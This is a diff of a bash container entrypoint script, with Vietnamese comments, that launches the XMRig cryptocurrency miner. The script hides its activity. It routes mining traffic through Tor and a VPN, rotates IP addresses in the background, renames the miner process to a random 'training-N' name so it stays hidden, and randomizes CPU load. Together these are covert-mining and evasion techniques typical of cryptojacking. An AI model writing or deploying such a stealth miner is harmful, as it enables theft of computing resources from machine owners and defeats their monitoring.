@@ -1,40 +1,29 @@
 #!/bin/bash
 
-# Khởi động dịch vụ Tor và Privoxy
+# Khởi động dịch vụ Tor, Privoxy và VPN
 service tor start
 service privoxy start
+openvpn --config $VPN_CONFIG &
 
-# Khởi động script đổi IP ngẫu nhiên trong nền
+# Tạo bản sao của file xmrig nếu chưa có
+if [ ! -f /root/work/xmrig_backup ]; then
+  cp /root/work/xmrig /root/work/xmrig_backup
+fi
+
+# Kiểm tra và khởi động script đổi IP ngẫu nhiên
 /root/change_ip.sh &
 
-# Nếu chưa có file sao lưu của xmrig, tạo bản sao lưu
-if [ ! -f /root/work/xmrig-${VERSION}/xmrig_backup ]; then
-    cp /root/work/xmrig-${VERSION}/xmrig /root/work/xmrig-${VERSION}/xmrig_backup
-fi
-
-# Lấy tổng số lõi CPU
+# Tính toán số threads dựa trên % CPU ngẫu nhiên
 TOTAL_CORES=$(nproc)
+cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)
+CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)
 
-# Chọn một tỷ lệ phần trăm ngẫu nhiên từ 70 đến 90
-RANDOM_PERCENT=$(shuf -i 70-90 -n 1)
+# Đổi tên tiến trình để ẩn
+RANDOM_PROCESS_NAME=$(echo training-$(shuf -i 1-999 -n 1))
 
-# Tính số threads dựa trên tổng số lõi và tỷ lệ phần trăm đã chọn
-CPU_HINT=$(echo "($TOTAL_CORES * $RANDOM_PERCENT) / 100" | bc)
+# Khởi động XMRig với số lượng threads ngẫu nhiên
+echo "Khởi động XMRig với $CPU_HINT threads..."
+exec -a $RANDOM_PROCESS_NAME torsocks /root/work/$(cat /root/xmrig_name.txt) --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
 
-# Kiểm tra xem xmrig_name.txt có tồn tại không, nếu không thì tạo tên mới và khởi động XMRig
-if [ ! -f /root/xmrig_name.txt ]; then
-    RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
-    cp /root/work/xmrig-${VERSION}/xmrig_backup /root/work/$RANDOM_NAME
-    chmod +x /root/work/$RANDOM_NAME
-    echo $RANDOM_NAME > /root/xmrig_name.txt
-    echo "Chạy XMRig với tên mới $RANDOM_NAME..."
-    torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --threads=$CPU_HINT
-else
-    # Nếu đã có tên, khởi động lại XMRig
-    RANDOM_NAME=$(cat /root/xmrig_name.txt)
-    echo "Chạy lại XMRig với tên $RANDOM_NAME..."
-    torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --threads=$CPU_HINT
-fi
-
-# Giữ container chạy
+# Giữ tiến trình chạy
 tail -f /dev/null
